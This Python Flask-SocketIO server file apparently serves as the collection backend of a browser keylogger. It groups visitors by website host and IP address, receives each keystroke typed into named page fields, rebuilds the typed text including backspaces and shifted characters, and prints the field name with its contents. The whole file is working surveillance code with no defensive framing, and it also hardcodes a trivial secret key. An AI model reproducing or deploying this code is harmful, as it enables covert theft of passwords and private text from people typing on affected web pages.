import json
import tables

from flask import Flask, render_template, request
from flask.ext.socketio import SocketIO, emit
from aux import pprint

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
#app.config['DEBUG'] = True
socketio = SocketIO(app)

hosts = {}

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect', namespace='/test')
def test_connect():
    emit('confirm connection', { 'data' : 'Connected' })

@socketio.on('send_details', namespace='/test')
def test_connect(message):

    details = message['page_details']

    host = details['url']['host']
    if host not in hosts:
        hosts[host] = {}

    clients = hosts[host]
    ip = request.remote_addr
    clients[ip] = {}
    client = clients[ip]

    for details in message['jskdetails']:
        _id = details['_id']
        client[_id] = {
            '_id' : _id,
            'info' :  details,
            'contents' : [],
        }

@socketio.on('disconnect', namespace='/test')
def test_disconnect():
    print 'Client disconnected'

@socketio.on('keydown', namespace='/test')
def keydown(message):

    ip = request.remote_addr

    host = message['page_details']['url']['host']
    '''
    if host not in hosts:
        hosts[host] = {}
    '''
    
    clients = hosts[host]
    client = clients[ip]

    '''
    client = message['page_details']['ipaddr']
    if client not in clients:
        clients[client] = {}
    '''

    text_field = message['data']['tag_details']
    _id = text_field['_id']
    '''
    text_field = message['data']['tag_details']
    _id = text_field['_id']
    if _id not in clients:

        clients[_id] = {
            '_id' : text_field['_id'],
            'info' :  text_field,
            'contents' : [],
        }
    '''
    contents = client[_id]['contents']
        
    keystroke = message['data']['ks']
    ctrl_pressed = message['data']['ctrl']
    alt_pressed = message['data']['alt']
    shift_pressed = message['data']['shift']
    selection_start = message['data']['start_pos']
    selection_end = message['data']['end_pos']

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

    keystroke = tables.keyboard[keystroke]

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            contents = contents[:selection_start] + contents[selection_end:]

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            contents = contents[:selection_start] + contents[selection_end:]
    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()
        contents.append(keystroke)


    print message['data']['tag_details']['name'], '-->',
    print ''.join(contents)

    #pprint(data)
    #pprint(message)

if __name__ == '__main__':
    socketio.run(app)
